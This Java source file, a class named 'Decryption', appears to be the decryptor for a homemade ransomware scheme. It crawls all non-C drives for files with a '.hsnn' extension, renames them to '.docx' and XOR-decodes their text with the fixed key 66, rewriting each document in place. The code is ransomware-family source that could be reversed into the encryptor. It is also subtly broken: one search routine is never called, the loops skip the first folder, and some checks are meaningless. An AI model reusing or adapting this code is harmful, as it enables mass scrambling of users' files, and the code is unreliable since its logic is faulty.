package dr.hassan;
import java.awt.Desktop;
import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import org.apache.poi.xwpf.usermodel.XWPFDocument;
import org.apache.poi.xwpf.usermodel.XWPFParagraph;
import org.apache.poi.xwpf.usermodel.XWPFRun;
public class Decryption 
{
    public static void main(String[] args) throws IOException
        {
            //search of the name of disk in computer
                File [] roots=File.listRoots();
              for(int i=0 ;i<roots.length ;i++)
                   {   
                      String namedisk= roots[i].getPath();
                      if(namedisk.contains("C"))   
                             continue;
                     else
                         {
                             ArrayList<String>array=new ArrayList<String>();
                             File f=new File( namedisk);
                             File[]allSubFiles=f.listFiles();
                             for(File file :allSubFiles)
                                   {
                                       if(file.isDirectory())
                                          {
                                              String dir=file.getAbsolutePath();                                      //get name of directory
                                               if(dir.contains("System")||dir.contains("WindowsApps"))
                                                     continue;
                                              else
                                                    array.add(dir);
                                          }     
                                    else
                                        {   
                                            String mm=file.getAbsolutePath();
                                            if(mm.length()==0&&mm.endsWith(".hsnn"))
                                                   rename(mm);
                                           else if (mm.endsWith(".hsnn")&&mm.length()!=0)
                                                  encoder(rename1(mm)) ;
                                          }
                        search1(array);
                                                   }
                                                             }
                                                                    }
                                                                               }
    
       public static void search1( ArrayList<String>array1) throws IOException
          { 
              ArrayList<String>array2=new ArrayList<String>();
              for(int i=1;i<array1.size();i++)
                { 
                       File ff=new File( array1.get(i));
                       File[]newfi=ff.listFiles();
                       for(File nnnew :newfi)
                            {
                                 if(nnnew.isDirectory())
                                  {
                                      String dir=nnnew.getAbsolutePath();                     //get name of directory
                                      array2.add(dir);
                                   }
                                  else
                                    {   
                                         String mm=nnnew.getAbsolutePath();
                                         if(mm.endsWith(".hsnn")&&mm.length()==0)
                                              rename(mm);
                                         else if (mm.endsWith(".hsnn")&&mm.length()!=0)
                                          encoder(rename1(mm))   ;
                                      }
                                          }
                                                   } 
                                                                  }
       
       public static void search2( ArrayList<String>array2) throws IOException
          {  
              ArrayList<String>array1=new ArrayList<String>();
              for(int i=1;i<array2.size();i++)
              {
                 File fff=new File( array2.get(i));
                 File[]newfilw=fff.listFiles();
                 for(File nnew :newfilw)
                    {
                          if(nnew.isDirectory())
                            {
                              String dir=nnew.getAbsolutePath();                  //get name of directory
                              array1.add(dir);
                            }
                           else
                                {   
                                        String mm=nnew.getAbsolutePath();
                                         if(mm.length()==0&&mm.endsWith(".hsnn"))
                                              rename(mm);
                                         else if (mm.endsWith(".hsnn")&&mm.length()!=0)
                                              encoder(rename1(mm));
                                }
                                       } 
                                              }
                                                     }
       
    public static void encoder (String filename) throws IOException
    {
                String pp=""; 
                try{
                           FileInputStream file =new FileInputStream(filename);
                           XWPFDocument docx=new XWPFDocument(file);
                           List<XWPFParagraph> paragraphList=docx.getParagraphs();
                           pp = paragraphList.stream().map((paragraph) -> paragraph.getText()).reduce(pp, String::concat);
                     
                 } catch (FileNotFoundException  e){
                             System.out.println("catch1");
                                          }
                  catch(IOException e){
                                             System.out.println("catch2");
                       }
    //encode file
                      int s=66;
                      String last="";
                      for (int z=0; z<pp.length();z++)
                            {  
                                int asc=pp.charAt(z);
                                 int n=asc^s;
                                 char m=(char)n;
                                 last+=m;
                             }
        //Write in docx file
         try{     
                      XWPFDocument document =new  XWPFDocument ();
                      FileOutputStream out = new FileOutputStream(new File (filename)) ;
                      XWPFParagraph  paragraph=document.createParagraph();
                      XWPFRun run=paragraph.createRun();
                      run.setText(last);
                      document.write(out);
                      }catch(IOException e){
                        System.out.println("chatsh2");
                     }
    }
    
    public static String rename1(String name) throws IOException
    {
              File f = new File(name); 
             String name1="";
             for(int m=0 ;m<name.length()-4;m++)
                   {
                       name1+=name.charAt(m);
                    }
             f.renameTo(new File(name1+"docx"));
                   return name1+"docx";
    }
    
     public static void rename(String name) throws IOException
     {
          File f = new File(name); 
         String name1="";
         for(int m=0 ;m<name.length()-4;m++)
                {
                   name1+=name.charAt(m);
                }
      f.renameTo(new File(name1+"docx"));
          }
              }
                    




     


     
        
        
        

